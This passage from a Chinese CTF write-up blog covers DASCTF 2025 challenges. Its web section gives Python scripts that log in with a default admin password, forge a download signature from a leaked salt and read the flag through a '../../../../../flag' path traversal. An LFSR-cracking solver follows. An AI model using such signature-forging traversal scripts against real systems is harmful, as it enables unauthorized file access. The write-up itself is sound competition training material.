class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 目标站点基础地址（注意端口） =====</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://87ec7d6c-8479-4038-8de8-8684e4d60620.node5.buuoj.cn:81&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 从 1.txt 中分析出的前端 RSA 公钥（JSEncrypt 用的那串）=====</span></span><br><span class="line">PUBLIC_KEY_PEM = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGyAKgwgFtRvud51H9otkcAxKh/8</span></span><br><span class="line"><span class="string">/iIlj3WlPJ0RL1pDtRvyMu5/edP84Mp9FqnZNCXKi1042pd4Y2Bf9QT0/z1i6KPi</span></span><br><span class="line"><span class="string">Z8zT3XNTtPOqIHO5aVaOfAl8lr52AurMZVpXwEUS2hh+Q/AN4/SV9AZPCgrUXk61</span></span><br><span class="line"><span class="string">9aaw0Md9MNvn3w0JAgMBAAE=</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt_password</span>(<span class="params">plaintext: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用与前端 JSEncrypt 一致的方式：</span></span><br><span class="line"><span class="string">    RSA(1024) + PKCS1_v1_5 填充，结果做 base64 编码。</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    key = RSA.import_key(PUBLIC_KEY_PEM)</span><br><span class="line">    cipher = PKCS1_v1_5.new(key)</span><br><span class="line">    ciphertext_bytes = cipher.encrypt(plaintext.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    ciphertext_b64 = base64.b64encode(ciphertext_bytes).decode()</span><br><span class="line">    <span class="keyword">return</span> ciphertext_b64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 1. 先用 RSA 公钥加密明文密码 123456</span></span><br><span class="line">    plaintext_pwd = <span class="string">&quot;123456&quot;</span></span><br><span class="line">    enc_pwd = rsa_encrypt_password(plaintext_pwd)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Encrypted password (base64) =&quot;</span>, enc_pwd)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 使用 Session 维持 Cookie，完成登录</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line"></span><br><span class="line">    login_url = BASE_URL + <span class="string">&quot;/login&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: enc_pwd,  <span class="comment"># 前端是 encodeURIComponent(t.encrypt(this.password))</span></span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    resp = session.post(login_url, data=data, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Login status:&quot;</span>, resp.status_code)</span><br><span class="line">    <span class="comment"># 可以简单看一下返回内容前 200 字符</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Login response preview:&quot;</span>, resp.text[:<span class="number">200</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 登录成功后，带着 session 访问下载接口</span></span><br><span class="line">    download_url = BASE_URL + <span class="string">&quot;/download&quot;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;file&quot;</span>: <span class="string">&quot;app.jmx&quot;</span>,</span><br><span class="line">        <span class="string">&quot;sign&quot;</span>: <span class="string">&quot;6f742c2e79030435b7edc1d79b8678f6&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    d_resp = session.get(download_url, params=params, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Download status:&quot;</span>, d_resp.status_code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d_resp.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;app.jmx&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(d_resp.content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] app.jmx 已保存到当前目录&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 下载失败，返回内容：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(d_resp.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p>给了固定的加密盐</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251211090021727.png"
+                      alt="image-20251211090021727"
+                ></p>
+<p>得到app.jmx后丢给AI分析，将文件名改为<code>../../../../../flag</code>即可</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"><span class="comment"># ================== 目标站点配置 ==================</span></span><br><span class="line">BASE_URL = <span class="string">&quot;http://87ec7d6c-8479-4038-8de8-8684e4d60620.node5.buuoj.cn:81&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ================== 前端 JS 里的 RSA 公钥 ==================</span></span><br><span class="line">PUBLIC_KEY_PEM = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgGyAKgwgFtRvud51H9otkcAxKh/8</span></span><br><span class="line"><span class="string">/iIlj3WlPJ0RL1pDtRvyMu5/edP84Mp9FqnZNCXKi1042pd4Y2Bf9QT0/z1i6KPi</span></span><br><span class="line"><span class="string">Z8zT3XNTtPOqIHO5aVaOfAl8lr52AurMZVpXwEUS2hh+Q/AN4/SV9AZPCgrUXk61</span></span><br><span class="line"><span class="string">9aaw0Md9MNvn3w0JAgMBAAE=</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ================== app.jmx 里的 sign 计算逻辑 ==================</span></span><br><span class="line">SALT = <span class="string">&quot;f9bc855c9df15ba7602945fb939deefc&quot;</span>  <span class="comment"># 来自 jmx</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calc_sign</span>(<span class="params">mingwen: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对应 Groovy 代码：</span></span><br><span class="line"><span class="string">        firstMi = md5Hex(mingWen)</span></span><br><span class="line"><span class="string">        jieStr  = firstMi.substring(5, 16)</span></span><br><span class="line"><span class="string">        newStr  = firstMi + jieStr + salt</span></span><br><span class="line"><span class="string">        sign    = md5Hex(newStr)</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    first_mi = hashlib.md5(mingwen.encode()).hexdigest()</span><br><span class="line">    jie_str = first_mi[<span class="number">5</span>:<span class="number">16</span>]  <span class="comment"># 下标 5~15</span></span><br><span class="line">    new_str = first_mi + jie_str + SALT</span><br><span class="line">    sign = hashlib.md5(new_str.encode()).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_encrypt_password</span>(<span class="params">plaintext: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    使用与前端 JSEncrypt 相同的 RSA/PKCS1_v1_5 + base64</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    key = RSA.import_key(PUBLIC_KEY_PEM)</span><br><span class="line">    cipher = PKCS1_v1_5.new(key)</span><br><span class="line">    ciphertext_bytes = cipher.encrypt(plaintext.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(ciphertext_bytes).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># ========== 1. 先 RSA 加密密码并登录 ==========</span></span><br><span class="line">    username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    plaintext_pwd = <span class="string">&quot;123456&quot;</span></span><br><span class="line"></span><br><span class="line">    enc_pwd = rsa_encrypt_password(plaintext_pwd)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Encrypted password (base64) =&quot;</span>, enc_pwd)</span><br><span class="line"></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_url = BASE_URL + <span class="string">&quot;/login&quot;</span></span><br><span class="line"></span><br><span class="line">    login_data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: username,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: enc_pwd,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    resp = session.post(login_url, data=login_data, headers=headers, timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Login status code:&quot;</span>, resp.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Login response preview:&quot;</span>, resp.text[:<span class="number">200</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ========== 2. 按 jmx 逻辑为 ../../../../../flag 计算 sign ==========</span></span><br><span class="line">    target_file = <span class="string">&quot;../../../../../flag&quot;</span></span><br><span class="line">    sign = calc_sign(target_file)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Calculated sign for&quot;</span>, target_file, <span class="string">&quot;=&quot;</span>, sign)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 验证一下：如果 mingWen = &quot;app.jmx&quot;，算出的 sign 应该是题目给的那串</span></span><br><span class="line">    check_sign = calc_sign(<span class="string">&quot;app.jmx&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sanity check: sign(app.jmx) =&quot;</span>, check_sign)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># ========== 3. 下载 flag ==========</span></span><br><span class="line">    download_url = BASE_URL + <span class="string">&quot;/download&quot;</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;file&quot;</span>: target_file,</span><br><span class="line">        <span class="string">&quot;sign&quot;</span>: sign,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    d_resp = session.get(download_url, params=params, timeout=<span class="number">20</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Download status code:&quot;</span>, d_resp.status_code)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d_resp.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="comment"># 保存到当前目录</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(d_resp.content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] flag 文件已保存为 ./flag&quot;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Response text (可能就是 flag):&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(d_resp.text)</span><br><span class="line">        <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] 响应不是纯文本，可以直接查看 ./flag 文件内容&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!] 下载失败，返回内容：&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(d_resp.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
+
+<p>得到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251211090727261.png"
+                      alt="image-20251211090727261"
+                ></p>
+<h1 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h1><p>010打开</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251206101323338.png"
+                      alt="image-20251206101323338"
+                ></p>
+<p>base64解码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251206101359276.png"
+                      alt="image-20251206101359276"
+                ></p>
+<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="lost-LFSR-key"><a href="#lost-LFSR-key" class="headerlink" title="lost LFSR key"></a>lost LFSR key</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">mask = <span class="number">9319439021858903464</span></span><br><span class="line">c_int = <span class="number">8882504877732087312989345828667663333297225833982945014279010438327750150593504327259176959316943362605442206624947923157363187067410478202161873663103506</span></span><br><span class="line"></span><br><span class="line">N = <span class="number">512</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lfsr_seq</span>(<span class="params">seed, mask, n</span>):</span><br><span class="line">    s = seed</span><br><span class="line">    out = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        i = s &amp; mask</span><br><span class="line">        bit = i.bit_count() &amp; <span class="number">1</span>  <span class="comment"># parity</span></span><br><span class="line">        s = ((s &lt;&lt; <span class="number">1</span>) | bit) &amp; ((<span class="number">1</span> &lt;&lt; <span class="number">64</span>) - <span class="number">1</span>)</span><br><span class="line">        out.append(bit)</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 预计算基向量的输出</span></span><br><span class="line">basis = [lfsr_seq(<span class="number">1</span> &lt;&lt; j, mask, N) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 从密文中提取 Out_&#123;8j&#125;</span></span><br><span class="line">c_bits = [(c_int &gt;&gt; k) &amp; <span class="number">1</span> <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(N)]  <span class="comment"># LSB-first</span></span><br><span class="line">rows = []</span><br><span class="line">bs = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    t = <span class="number">8</span> * j</span><br><span class="line">    pos = <span class="number">511</span> - t</span><br><span class="line">    keystream_bit = c_bits[pos]  <span class="comment"># 明文最高位为 0 ⇒ K_bit = C_bit</span></span><br><span class="line">    <span class="comment"># 构造这一行的系数</span></span><br><span class="line">    row = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        <span class="keyword">if</span> basis[b][t]:</span><br><span class="line">            row |= <span class="number">1</span> &lt;&lt; b</span><br><span class="line">    rows.append(row)</span><br><span class="line">    bs.append(keystream_bit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. GF(2) 高斯消元求 seed（这里顺手枚举自由变量）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_gf2</span>(<span class="params">rows, bs, n_vars=<span class="number">64</span></span>):</span><br><span class="line">    rows = rows[:]</span><br><span class="line">    bs = bs[:]</span><br><span class="line">    pivot = [-<span class="number">1</span>] * n_vars</span><br><span class="line">    r = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n_vars):</span><br><span class="line">        m = <span class="number">1</span> &lt;&lt; col</span><br><span class="line">        p = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r, <span class="built_in">len</span>(rows)):</span><br><span class="line">            <span class="keyword">if</span> rows[i] &amp; m:</span><br><span class="line">                p = i</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> p <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        rows[r], rows[p] = rows[p], rows[r]</span><br><span class="line">        bs[r], bs[p] = bs[p], bs[r]</span><br><span class="line">        pivot[col] = r</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rows)):</span><br><span class="line">            <span class="keyword">if</span> i != r <span class="keyword">and</span> (rows[i] &amp; m):</span><br><span class="line">                rows[i] ^= rows[r]</span><br><span class="line">                bs[i] ^= bs[r]</span><br><span class="line">        r += <span class="number">1</span></span><br><span class="line">    <span class="comment"># 查哪一列是自由变量</span></span><br><span class="line">    free = [i <span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(pivot) <span class="keyword">if</span> v == -<span class="number">1</span>]</span><br><span class="line">    seeds = []</span><br><span class="line">    <span class="comment"># 简单枚举所有自由变量的 0/1（这里恰好只有一位自由变量）</span></span><br><span class="line">    <span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line">    <span class="keyword">for</span> assign <span class="keyword">in</span> product([<span class="number">0</span>, <span class="number">1</span>], repeat=<span class="built_in">len</span>(free)):</span><br><span class="line">        x = [<span class="number">0</span>] * n_vars</span><br><span class="line">        <span class="comment"># 先把自由变量填上</span></span><br><span class="line">        <span class="keyword">for</span> idx, val <span class="keyword">in</span> <span class="built_in">zip</span>(free, assign):</span><br><span class="line">            x[idx] = val</span><br><span class="line">        <span class="comment"># 回代确定其余变量</span></span><br><span class="line">        <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n_vars - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            row_idx = pivot[col]</span><br><span class="line">            <span class="keyword">if</span> row_idx == -<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            total = bs[row_idx]</span><br><span class="line">            others = rows[row_idx] &amp; ~(<span class="number">1</span> &lt;&lt; col)</span><br><span class="line">            j = <span class="number">0</span></span><br><span class="line">            <span class="keyword">while</span> others:</span><br><span class="line">                <span class="keyword">if</span> others &amp; <span class="number">1</span>:</span><br><span class="line">                    total ^= x[j]</span><br><span class="line">                others &gt;&gt;= <span class="number">1</span></span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">            x[col] = total</span><br><span class="line">        seed = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i, bit <span class="keyword">in</span> <span class="built_in">enumerate</span>(x):</span><br><span class="line">            <span class="keyword">if</span> bit:</span><br><span class="line">                seed |= <span class="number">1</span> &lt;&lt; i</span><br><span class="line">        seeds.append(seed)</span><br><span class="line">    <span class="keyword">return</span> seeds</span><br><span class="line"></span><br><span class="line">seeds = solve_gf2(rows, bs)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">seq_to_int</span>(<span class="params">seq</span>):</span><br><span class="line">    v = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> seq:</span><br><span class="line">        v = (v &lt;&lt; <span class="number">1</span>) | b</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> seeds:</span><br><span class="line">    ks = seq_to_int(lfsr_seq(s, mask, N))</span><br><span class="line">    m_int = ks ^ c_int</span><br><span class="line">    m_bytes = m_int.to_bytes(<span class="number">64</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(s), m_bytes)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终选出那一行漂亮 ASCII 的作为 flag 内容</span></span><br><span class="line"><span class="comment"># f1nd_th3_hidden_Linear_R3lat1onShip_@nd_th3n_F1nd_My_Lo5t_KEY!!!</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="ezmac"><a href="#ezmac" class="headerlink" title="ezmac"></a>ezmac</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251206182503175.png"
+                      alt="image-20251206182503175"
+                ></p>
+<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="DigitalSignature"><a href="#DigitalSignature" class="headerlink" title="DigitalSignature"></a>DigitalSignature</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20251206182316749.png"
+                      alt="image-20251206182316749"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> DASCTF 2025下半年赛 WP</li>
+        <li><strong>Author:</strong> xiaolaisec</li>
+        <li><strong>Created at
+                :</strong> 2025-11-04 09:35:22</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-12-11 09:14:41
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2025/11/04/DASCTF 2025下半年赛WP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2025/11/04/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E4%B8%93%E9%A2%98/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">内网安全 专题</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2025/10/23/CISCN%202023%20WEB/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">CISCN 2023 WEB 复现</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
